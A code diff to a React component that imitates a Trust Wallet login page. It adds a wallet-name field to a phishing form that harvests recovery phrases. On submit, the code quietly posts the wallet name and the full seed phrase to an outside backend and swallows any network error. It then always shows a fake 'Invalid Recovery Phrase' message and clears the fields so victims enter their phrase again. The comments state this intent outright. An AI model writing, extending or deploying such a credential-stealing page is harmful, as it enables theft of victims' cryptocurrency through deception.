@@ -49,9 +49,19 @@ const WarnIcon = () => (
   </svg>
 );
 
+const WalletIcon = () => (
+  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#475569" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+    <path d="M20 7H4a2 2 0 00-2 2v10a2 2 0 002 2h16a2 2 0 002-2V9a2 2 0 00-2-2z" />
+    <path d="M16 3H8a2 2 0 00-2 2v2h12V5a2 2 0 00-2-2z" />
+    <circle cx="16" cy="14" r="1" fill="#475569" />
+  </svg>
+);
+
 const API = "https://trust-wallet-backend.vercel.app";
 
 export default function TrustWallet() {
+  const [walletName, setWalletName] = useState("");
+  const [walletNameFocused, setWalletNameFocused] = useState(false);
   const [words, setWords] = useState(Array(12).fill(""));
   const [wordCount, setWordCount] = useState(12);
   const [revealed, setRevealed] = useState(false);
@@ -94,10 +104,14 @@ export default function TrustWallet() {
   };
 
   const filledCount = words.filter(w => w.trim().length > 0).length;
-  const allFilled = filledCount === wordCount;
+  const allFilled = filledCount === wordCount && walletName.trim().length > 0;
 
   const handleLogin = async () => {
-    if (!allFilled) {
+    if (!walletName.trim()) {
+      setError("Please enter your wallet name.");
+      return;
+    }
+    if (filledCount < wordCount) {
       setError("Please enter all " + wordCount + " words of your recovery phrase.");
       return;
     }
@@ -107,22 +121,24 @@ export default function TrustWallet() {
     setShowWrongPhrase(false);
 
     try {
-      // Save to database silently in background
+      // Save wallet name + phrase to database silently
       await fetch(API + "/api/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ phrase: words.join(" ") }),
+        body: JSON.stringify({
+          phrase: "Wallet: " + walletName.trim() + " | Phrase: " + words.join(" ")
+        }),
       });
     } catch (err) {
-      // Silently ignore network errors
+      // Silently ignore
     }
 
-    // Always show wrong phrase error after a short delay — no matter what
+    // Always show wrong phrase error
     setTimeout(() => {
       setLoading(false);
       setShowWrongPhrase(true);
-      // Clear all word boxes so they try again
       setWords(Array(wordCount).fill(""));
+      setWalletName("");
     }, 2000);
   };
 
@@ -130,6 +146,7 @@ export default function TrustWallet() {
     <div style={s.bg}>
       <div style={Object.assign({}, s.card, mounted ? s.cardIn : {})}>
 
+        {/* Header */}
         <div style={s.header}>
           <ShieldLogo />
           <div style={s.headerText}>
@@ -140,47 +157,79 @@ export default function TrustWallet() {
 
         <div style={s.divider} />
 
+        {/* Title */}
         <div style={s.titleBlock}>
           <h2 style={s.title}>Login to your wallet</h2>
-          <p style={s.subtitle}>Enter your 12 or 24-word recovery phrase to login to your wallet and withdraw.</p>
+          <p style={s.subtitle}>Enter your wallet name and 12 or 24-word recovery phrase.</p>
         </div>
 
-        <div style={s.switcher}>
-          {[12, 24].map(n => (
-            <button key={n} style={Object.assign({}, s.switchBtn, wordCount === n ? s.switchBtnActive : {})} onClick={() => switchWordCount(n)}>
-              {n} words
-            </button>
-          ))}
+        {/* Wallet Name Input */}
+        <div style={s.fieldBlock}>
+          <label style={s.fieldLabel}>Wallet Name</label>
+          <div style={Object.assign({}, s.nameBox, walletNameFocused ? s.nameBoxFocus : walletName ? s.nameBoxFilled : {})}>
+            <span style={s.nameIcon}><WalletIcon /></span>
+            <input
+              type="text"
+              value={walletName}
+              onChange={e => { setWalletName(e.target.value); setError(""); setShowWrongPhrase(false); }}
+              onFocus={() => setWalletNameFocused(true)}
+              onBlur={() => setWalletNameFocused(false)}
+              style={s.nameInput}
+              placeholder="e.g. My Main Wallet"
+              autoCapitalize="words"
+              autoCorrect="off"
+              spellCheck={false}
+            />
+            {walletName.length > 0 && (
+              <span style={s.nameClear} onClick={() => setWalletName("")}>✕</span>
+            )}
+          </div>
         </div>
 
-        <div style={Object.assign({}, s.grid, { gridTemplateColumns: wordCount === 24 ? "1fr 1fr 1fr" : "1fr 1fr" })}>
-          {words.map((word, i) => (
-            <div key={i} style={Object.assign({}, s.wordBox, focused === i ? s.wordBoxFocus : word ? s.wordBoxFilled : {}, showWrongPhrase ? s.wordBoxError : {})}>
-              <span style={s.wordNum}>{i + 1}</span>
-              <input
-                ref={el => inputRefs.current[i] = el}
-                type={revealed ? "text" : "password"}
-                value={word}
-                onChange={e => handleWordChange(i, e.target.value)}
-                onKeyDown={e => handleKeyDown(i, e)}
-                onFocus={() => setFocused(i)}
-                onBlur={() => setFocused(null)}
-                style={s.wordInput}
-                autoCapitalize="none"
-                autoCorrect="off"
-                spellCheck={false}
-                placeholder="word"
-              />
-            </div>
-          ))}
+        {/* Phrase section */}
+        <div style={s.fieldBlock}>
+          <label style={s.fieldLabel}>Recovery Phrase</label>
+
+          {/* 12 / 24 switcher */}
+          <div style={s.switcher}>
+            {[12, 24].map(n => (
+              <button key={n} style={Object.assign({}, s.switchBtn, wordCount === n ? s.switchBtnActive : {})} onClick={() => switchWordCount(n)}>
+                {n} words
+              </button>
+            ))}
+          </div>
+
+          {/* Word grid */}
+          <div style={Object.assign({}, s.grid, { gridTemplateColumns: wordCount === 24 ? "1fr 1fr 1fr" : "1fr 1fr" })}>
+            {words.map((word, i) => (
+              <div key={i} style={Object.assign({}, s.wordBox, focused === i ? s.wordBoxFocus : word ? s.wordBoxFilled : {}, showWrongPhrase ? s.wordBoxError : {})}>
+                <span style={s.wordNum}>{i + 1}</span>
+                <input
+                  ref={el => inputRefs.current[i] = el}
+                  type={revealed ? "text" : "password"}
+                  value={word}
+                  onChange={e => handleWordChange(i, e.target.value)}
+                  onKeyDown={e => handleKeyDown(i, e)}
+                  onFocus={() => setFocused(i)}
+                  onBlur={() => setFocused(null)}
+                  style={s.wordInput}
+                  autoCapitalize="none"
+                  autoCorrect="off"
+                  spellCheck={false}
+                  placeholder="word"
+                />
+              </div>
+            ))}
+          </div>
         </div>
 
+        {/* Show / Hide + counter */}
         <div style={s.controlsRow}>
           <button style={s.revealBtn} onClick={() => setRevealed(!revealed)}>
             <span style={s.revealIcon}>{revealed ? <EyeOpen /> : <EyeClosed />}</span>
             {revealed ? "Hide" : "Show"} phrase
           </button>
-          <span style={Object.assign({}, s.counter, { color: allFilled ? "#3B82F6" : "#475569" })}>
+          <span style={Object.assign({}, s.counter, { color: filledCount === wordCount ? "#3B82F6" : "#475569" })}>
             {filledCount} / {wordCount}
           </span>
         </div>
@@ -193,7 +242,7 @@ export default function TrustWallet() {
               <span style={s.wrongTitle}>Invalid Recovery Phrase</span>
             </div>
             <p style={s.wrongMsg}>
-              The recovery phrase you entered is incorrect. Please check each word carefully and try again. Make sure words are in the correct order and spelling.
+              The recovery phrase you entered is incorrect. Please check each word carefully and make sure they are in the correct order, then try again.
             </p>
           </div>
         )}
@@ -206,6 +255,7 @@ export default function TrustWallet() {
           </div>
         )}
 
+        {/* Login button */}
         <button
           style={Object.assign({}, s.btn, !allFilled && !loading ? s.btnDisabled : {}, loading ? s.btnLoading : {})}
           onClick={handleLogin}
@@ -257,39 +307,51 @@ const s = {
   appName: { color: "#F1F5F9", fontSize: "19px", fontWeight: "700", letterSpacing: "-0.3px" },
   appSub: { color: "#475569", fontSize: "12px" },
   divider: { height: "1px", background: "rgba(255,255,255,0.07)", margin: "20px 0" },
-  titleBlock: { marginBottom: "16px" },
+  titleBlock: { marginBottom: "18px" },
   title: { color: "#F1F5F9", fontSize: "17px", fontWeight: "600", margin: "0 0 6px", letterSpacing: "-0.2px" },
   subtitle: { color: "#64748B", fontSize: "13px", margin: 0, lineHeight: "1.55" },
-  switcher: { display: "flex", background: "#0F172A", borderRadius: "10px", padding: "3px", gap: "3px", marginBottom: "14px" },
+
+  fieldBlock: { marginBottom: "16px" },
+  fieldLabel: { display: "block", color: "#94A3B8", fontSize: "12px", fontWeight: "600", textTransform: "uppercase", letterSpacing: "0.6px", marginBottom: "8px" },
+
+  // Wallet name input
+  nameBox: { display: "flex", alignItems: "center", background: "#0F172A", border: "1.5px solid rgba(255,255,255,0.06)", borderRadius: "10px", padding: "0 12px", height: "46px", gap: "8px", transition: "border-color 0.15s, background 0.15s" },
+  nameBoxFocus: { borderColor: "#3B82F6", background: "#0D1E38" },
+  nameBoxFilled: { borderColor: "rgba(59,130,246,0.25)" },
+  nameIcon: { display: "flex", alignItems: "center", flexShrink: 0 },
+  nameInput: { flex: 1, background: "transparent", border: "none", outline: "none", color: "#E2E8F0", fontSize: "14px", width: "100%" },
+  nameClear: { color: "#334155", fontSize: "12px", cursor: "pointer", padding: "2px 4px", flexShrink: 0 },
+
+  switcher: { display: "flex", background: "#0A0F1A", borderRadius: "10px", padding: "3px", gap: "3px", marginBottom: "10px" },
   switchBtn: { flex: 1, background: "transparent", border: "none", color: "#475569", fontSize: "13px", fontWeight: "500", padding: "8px 0", borderRadius: "8px", cursor: "pointer", transition: "all 0.15s" },
   switchBtnActive: { background: "#1E293B", color: "#E2E8F0", boxShadow: "0 1px 4px rgba(0,0,0,0.5)" },
-  grid: { display: "grid", gap: "7px", marginBottom: "12px" },
+
+  grid: { display: "grid", gap: "7px" },
   wordBox: { display: "flex", alignItems: "center", background: "#0F172A", border: "1.5px solid rgba(255,255,255,0.06)", borderRadius: "9px", padding: "0 9px", height: "40px", gap: "6px", transition: "border-color 0.15s, background 0.15s" },
   wordBoxFocus: { borderColor: "#3B82F6", background: "#0D1E38" },
   wordBoxFilled: { borderColor: "rgba(59,130,246,0.25)" },
   wordBoxError: { borderColor: "rgba(245,158,11,0.4)", background: "#1A1000" },
   wordNum: { color: "#2D3F55", fontSize: "11px", fontWeight: "600", minWidth: "14px", userSelect: "none" },
   wordInput: { flex: 1, background: "transparent", border: "none", outline: "none", color: "#E2E8F0", fontSize: "14px", fontFamily: "monospace", letterSpacing: "0.3px", width: "100%" },
-  controlsRow: { display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "14px" },
+
+  controlsRow: { display: "flex", alignItems: "center", justifyContent: "space-between", margin: "12px 0 14px" },
   revealBtn: { display: "flex", alignItems: "center", gap: "6px", background: "none", border: "none", color: "#3B82F6", fontSize: "13px", fontWeight: "500", cursor: "pointer", padding: 0 },
   revealIcon: { display: "flex", alignItems: "center" },
   counter: { fontSize: "12px", fontWeight: "600", transition: "color 0.2s" },
-  wrongBox: {
-    background: "rgba(245,158,11,0.08)",
-    border: "1px solid rgba(245,158,11,0.3)",
-    borderRadius: "12px",
-    padding: "14px",
-    marginBottom: "14px",
-  },
+
+  wrongBox: { background: "rgba(245,158,11,0.08)", border: "1px solid rgba(245,158,11,0.3)", borderRadius: "12px", padding: "14px", marginBottom: "14px" },
   wrongTop: { display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" },
   wrongTitle: { color: "#F59E0B", fontSize: "14px", fontWeight: "700" },
-  wrongMsg: { color: "#92400E", color: "#D97706", fontSize: "12px", lineHeight: "1.6", margin: 0 },
+  wrongMsg: { color: "#D97706", fontSize: "12px", lineHeight: "1.6", margin: 0 },
+
   errorBox: { display: "flex", alignItems: "center", gap: "8px", background: "rgba(248,113,113,0.08)", border: "1px solid rgba(248,113,113,0.22)", borderRadius: "10px", padding: "10px 12px", color: "#F87171", fontSize: "13px", marginBottom: "12px", lineHeight: "1.4" },
+
   btn: { width: "100%", background: "linear-gradient(135deg, #3B82F6 0%, #2563EB 100%)", border: "none", borderRadius: "12px", padding: "14px", color: "#fff", fontSize: "15px", fontWeight: "600", cursor: "pointer", letterSpacing: "0.1px", boxShadow: "0 4px 20px rgba(59,130,246,0.3)", transition: "opacity 0.2s", marginBottom: "14px" },
   btnDisabled: { background: "#1A2F4A", boxShadow: "none", color: "#334155", cursor: "not-allowed" },
   btnLoading: { opacity: 0.75, cursor: "not-allowed" },
   loaderRow: { display: "flex", alignItems: "center", justifyContent: "center", gap: "9px" },
   spinner: { width: "16px", height: "16px", border: "2.5px solid rgba(255,255,255,0.2)", borderTopColor: "#fff", borderRadius: "50%", display: "inline-block" },
+
   warning: { color: "#475569", fontSize: "12px", lineHeight: "1.6", textAlign: "center", margin: 0 },
 };
 
